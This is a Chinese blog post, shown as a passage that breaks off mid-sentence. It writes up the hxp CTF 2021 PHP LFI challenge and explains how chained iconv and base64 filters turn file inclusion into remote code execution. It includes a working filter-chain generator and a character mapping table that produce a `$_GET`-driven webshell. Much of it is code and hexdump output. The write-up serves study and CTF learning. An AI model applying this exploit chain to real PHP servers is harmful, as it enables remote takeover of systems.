<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="[TOC]
接上回 hxp CTF 的题目，本文介绍一下之前 counter 题目的 LFI 解法，以及令人极其赞叹的 LFI 新技巧，可以说是 The End Of LFI 了。
"><title>hxp CTF 2021 - The End Of LFI?</title><link rel=canonical href=https://blog.zeddyu.info/2022/01/08/2022-01-08-TheEndOfLFI/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="hxp CTF 2021 - The End Of LFI?"><meta property="og:description" content="[TOC]
接上回 hxp CTF 的题目，本文介绍一下之前 counter 题目的 LFI 解法，以及令人极其赞叹的 LFI 新技巧，可以说是 The End Of LFI 了。
"><meta property="og:url" content="https://blog.zeddyu.info/2022/01/08/2022-01-08-TheEndOfLFI/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2022-01-08T17:44:57+08:00"><meta property="article:modified_time" content="2022-01-08T17:44:57+08:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="hxp CTF 2021 - The End Of LFI?"><meta name=twitter:description content="[TOC]
接上回 hxp CTF 的题目，本文介绍一下之前 counter 题目的 LFI 解法，以及令人极其赞叹的 LFI 新技巧，可以说是 The End Of LFI 了。
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e='StackColorScheme';localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t='StackColorScheme',e=localStorage.getItem(t),n=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;e=='dark'||e==='auto'&&n?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2022/01/08/2022-01-08-TheEndOfLFI/>hxp CTF 2021 - The End Of LFI?</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jan 08, 2022</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><p>[TOC]</p><p>接上回 hxp CTF 的题目，本文介绍一下之前 counter 题目的 LFI 解法，以及令人极其赞叹的 LFI 新技巧，可以说是 The End Of LFI 了。</p><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>文章首发于跳跳堂：<a class=link href=https://tttang.com/archive/1395/ target=_blank rel=noopener>hxp CTF 2021 - The End Of LFI?</a></p></div><h2 id=tldr>TL;DR</h2><p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p><p>第一部分介绍利用背景以及原理，第二部分简单介绍 Fuzz 编码规则的原理，第三部分介绍相关的 CTF 题目。</p><p>这里先贴一下作者的 exp 地址，以示尊重：<a class=link href=https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d target=_blank rel=noopener>Solving &ldquo;includer&rsquo;s revenge&rdquo; from hxp ctf 2021 without controlling any files</a></p><div class="notice notice-info"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v1e2h12c7 0 12 5 12 12v24z"/></svg></div><p>此种方法会受到 iconv 的限制，如果系统没有 iconv 或者不同于本文的 iconv 版本，将会有不同的表现。本文测试环境为：</p><p>OS: Ubuntu Ubuntu 20.04.3 LTS ; iconv version: iconv (Ubuntu GLIBC 2.31-0ubuntu9.4) 2.31</p></div><h2 id=back-to-lfi>Back To LFI</h2><p>原本以为上次通过 POST 过大的 Body 正文让 Nginx 产生 Tmp 进而配合多重链接绕过 PHP 包含限制完成 RCE 已经是非常绝妙的了，但是利用点可能也相对局限，毕竟只验证了 Nginx ，可能换到其他服务器就不行了。</p><p>但是，<strong>众所周知</strong>，LFI 是本地文件包含漏洞，突出一个<strong>文件</strong>，但是在 PHP 当中就比较的特殊了，我们可以通过 PHP Filter 来对文件进行一些简单的操作，例如比如 p 牛在 2016 年玩的令人印象深刻的利用的使用 Filter 技巧绕过死亡 exit 的操作：<a class=link href=https://www.leavesongs.com/PENETRATION/php-filter-magic.html target=_blank rel=noopener>谈一谈php://filter的妙用</a> （完了，都 2022 年了，我还在学 P 牛 2016 年的老东西）。</p><p>我们可以简单回顾一下。</p><h3 id=php-base64-filter>PHP Base64 filter</h3><p>在 p 牛绕过死亡 exit 的文章（为了行文方便，下文以“ p 文”代称这篇文章）里面，我们可以知道，对于 PHP Base64 Filter 来说，会忽略掉非正常编码的字符，比如 p 文中就利用 PHP Filter Base64 可以去掉一些特殊字符：</p><blockquote><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?></code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、>、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p></blockquote><p>回到 PHP Base64 ，那什么是合法字符呢？</p><p>合法字符只有<code>A-Za-z0-9\/\=\+</code>，其他字符会自动被忽略，那么包括不可见字符、控制字符什么的吗？</p><p>简单做个验证：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x1b</span><span class=s2>Y</span><span class=se>\xff</span><span class=s2>Q</span><span class=se>\xfa</span><span class=s2>&#34;</span><span class=p>;</span>				<span class=c1>//YQ 为 a 的 base64 编码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>var_dump</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// string(1) &#34;a&#34;
</span></span></span></code></pre></div><p>我们可以看到，PHP 在处理 Base64 字符串的时候完全忽略了非法字符，并且成功解码了。</p><p>好，让我们开始试一试吧！尝试 RCE 一句话 <code>include</code> 吧？！</p><p><figure><a href=https://s4.ax1x.com/2022/01/02/TTT0r8.jpg><img src=https://s4.ax1x.com/2022/01/02/TTT0r8.jpg loading=lazy alt=TTT0r8.jpg></a><figcaption>TTT0r8.jpg</figcaption></figure></p><h3 id=iconv-lfi>Iconv LFI</h3><p>接下来，我们这里再回顾一下 LFI ，由于 PHP Filter 的存在，我们可以利用一些操作简单处理一下对文件的编码格式等，举一个简单的例子，如果我们有一个文件内容为 <code>&lt;?php phpinfo();</code> 的 Base64 编码内容，当我们尝试 <code>include</code> 的时候就可以执行成功了：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;php://filter/convert.base64-decode/resource=./e&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// the content of e: PD9waHAgcGhwaW5mbygpOw==
</span></span></span><span class=line><span class=cl><span class=c1>// base64 code of `&lt;?php phpinfo();` is: PD9waHAgcGhwaW5mbygpOw== (without the backquote)
</span></span></span></code></pre></div><p>所以，众所周知，<code>include</code> 函数实际包含的是 Base64 解码后的 PHP 代码。</p><p>那我们有没有办法通过编码形式，构造产生自己想要的内容呢？这里就提到了我们今天要介绍的技巧。</p><p>PHP Filter 当中有一种 <code>convert.iconv</code> 的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从 <code>iconv -l</code> 获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p><p>举个简单的例子：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Output:
</span></span></span><span class=line><span class=cl><span class=c1>// some+ADwAPg-text
</span></span></span></code></pre></div><p>使用以上例子，我们可以通过 iconv 来将 UTF-8 字符集转换到 UTF-7 字符集。那么这个有什么用呢？</p><p>结合我们上述提到的编码、文件内容，我们是不是可以利用一些固定文件内容来产生 webshell 呢？</p><p>结合 PHP Base64 宽松性，即使我们使用其他字符编码产生了不可见字符，我们也可以利用 <code>convert.base64-decode</code> 来去掉非法字符，留下我们想要的字符。</p><p>所以我们先假设我们的文件内容为 14 个 a 字符，我们可以通过暴力遍历 iconv 支持的字符编码形式，看我们得到的结果，例如：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaa&#34;</span><span class=p>;</span>		<span class=c1>//我们这里简单使用 `data://` 来模拟文件内容读取。
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump:
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &#34;.$)C|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&#34;.|
</span></span></span></code></pre></div><p>我们可以看到这个 <code>UTF8.CSISO2022KR</code> 编码形式，并且通过这个编码形式产生的字符串里面， C 字符前面的字符对于 PHP Base64 来说是非法字符，所以接下来我们只需要 base64-decode 一下就可以去掉不可见字符了，但是与此同时，我们的 C 字符也被 base64-decode 解码了，这时候我们需要再把解码结果使用一次 base64-encode 即可还原回来原来的 C 字符了。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;|convert.base64-decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 31  31 29 20 22 09 a6 9a 69  |string(11) &#34;...i|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  a6 9a 69 a6 9a 69 a6 22  0a                       |..i..i.&#34;.|
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;|convert.base64-decode|convert.base64-encode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &#34;Caaa|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&#34;.|
</span></span></span></code></pre></div><h3 id=craft-base64-payload>Craft Base64 Payload</h3><p>那我们应该怎么构造需要的内容呢？因为 base64 编码合法字符里面并没有尖括号，所以我们不能通过以上方式直接产生 PHP 代码进行包含，但是我们可以通过以上技巧来产生一个 base64 字符串，最后再使用一次 base64 解码一次就可以了。</p><p>例如我们生成 <code>PAaaaaa</code> ，最后经过 base64 解码得到第一个字符为 &lt; ，后续为其他不需要的字符（我们这里不需要的字符称为垃圾字符）的字符串。</p><p>所以我们接下来需要做的，就是利用以上技巧找到这么一类编码，可以只存在我们需要的构造一个 webshell 的 base64 字符串了。</p><p>我们先看作者使用的几个示例，例如字符 8 ，我们可以使用 <code>convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2</code> 来生成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;php://filter/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nv>$url</span><span class=o>.</span><span class=s2>&#34;|convert.base64-decode|convert.base64-encode|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// $url = $url.&#34;|convert.base64-decode|convert.base64-encode&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>.=</span> <span class=s2>&#34;/resource=data://,aaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 35  32 29 20 22 38 01 fe 00  |string(52) &#34;8...|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  43 00 00 00 61 00 00 00  61 00 00 00 61 00 00 00  |C...a...a...a...|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000020  61 00 00 00 61 00 00 00  61 00 00 00 61 00 00 00  |a...a...a...a...|
</span></span></span><span class=line><span class=cl><span class=c1>// *
</span></span></span><span class=line><span class=cl><span class=c1>// 00000040  22 0a                                             |&#34;.|
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 起用了注释那一行后，即还原到 Base64 之后的 hexdump:
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 38 43 61 61  |string(12) &#34;8Caa|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&#34;.|
</span></span></span></code></pre></div><p>我们可以通过这种形式来将前面部分的构造成我们所需要的 base64 字符串，最后 base64 解码即可成为我们想要的 PHP 代码了。</p><h3 id=rce>RCE</h3><p>因为最终的 base64 字符串，是由 iconv 相对应的编码规则生成的，所以我们最好通过已有的编码规则来适当地匹配自己想要的 webshell ，比如</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?=</span><span class=sb>`$_GET[0]`</span><span class=p>;;</span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>以上 payload 的 base64 编码为 <code>PD89YCRfR0VUWzBdYDs7Pz4=</code> ，而如果只使用了一个分号，则编码结果为 <code>PD89YCRfR0VUWzBdYDs/Pg==</code> ，这里 7 可能相对于斜杠比较好找一些，也可能是 exp 作者没有 fuzz 或者找到斜杠的生成规则，所以作者这里使用了两个分号避开了最终 base64 编码中的斜杠。</p><p>根据以上规则，再将其反推回去即可，可以验证一下我们得到的结果：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$base64_payload</span> <span class=o>=</span> <span class=s2>&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$conversions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;R&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;B&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;C&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;8&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;9&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;f&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;s&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;z&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;U&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;P&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;V&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;0&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Y&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;W&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;d&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;D&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;7&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;4&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$filters</span> <span class=o>=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$filters</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nx>str_split</span><span class=p>(</span><span class=nx>strrev</span><span class=p>(</span><span class=nv>$base64_payload</span><span class=p>))</span> <span class=k>as</span> <span class=nv>$c</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filters</span> <span class=o>.=</span> <span class=nv>$conversions</span><span class=p>[</span><span class=nv>$c</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filters</span> <span class=o>.=</span> <span class=s2>&#34;convert.base64-decode|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filters</span> <span class=o>.=</span> <span class=s2>&#34;convert.base64-encode|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filters</span> <span class=o>.=</span> <span class=s2>&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$filters</span> <span class=o>.=</span> <span class=s2>&#34;convert.base64-decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$final_payload</span> <span class=o>=</span> <span class=s2>&#34;php://filter/</span><span class=si>{</span><span class=nv>$filters</span><span class=si>}</span><span class=s2>/resource=data://,aaaaaaaaaaaaaaaaaaaa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// echo $final_payload;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$final_payload</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// hexdump
</span></span></span><span class=line><span class=cl><span class=c1>// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &#34;&lt;?=`|
</span></span></span><span class=line><span class=cl><span class=c1>// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&#34;.|
</span></span></span></code></pre></div><p>这里需要注意的地方是：</p><ul><li><code>convert.iconv.UTF8.UTF7</code> 将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让 <code>convert.base64-decode</code> 过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。但是实际测试貌似我遇到的情况并没有抛出 Error ，最差情况抛出了 warning 但不是特别影响，但是为了避免奇怪的错误，还是加上为好。</li><li><code>data://,</code>后的数据是为了方便展示，需要补足一定的位数，当然如果使用 <code>include</code> 就不能用了，毕竟需要 RFI ，如果 RFI 选项能用，既然都是 RFI 了还整啥 LFI 呢2333</li></ul><p>当然通过以上案例，我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用 <code>/etc/passwd</code>:</p><p><figure><a href=https://storage.tttang.com/media/attachment/2022/01/03/49007e58-cab9-4d76-a038-76874a94e4fd.png><img src=https://storage.tttang.com/media/attachment/2022/01/03/49007e58-cab9-4d76-a038-76874a94e4fd.png loading=lazy></a></figure></p><p>完成 RCE</p><h2 id=fuzz>Fuzz</h2><h3 id=iconv-filter-chain>iconv Filter Chain</h3><p>让我们再回过头来看，虽然这个做法比较的新颖，但是其实深入理解之后会发现，这个攻击技巧需要我们提前把所有单字符的编码形式给 fuzz 出来，而且 fuzz 的结果还要有一定的技巧性，并不是所有出现了合法字符的编码形式就是符合要求的。</p><p>在跟 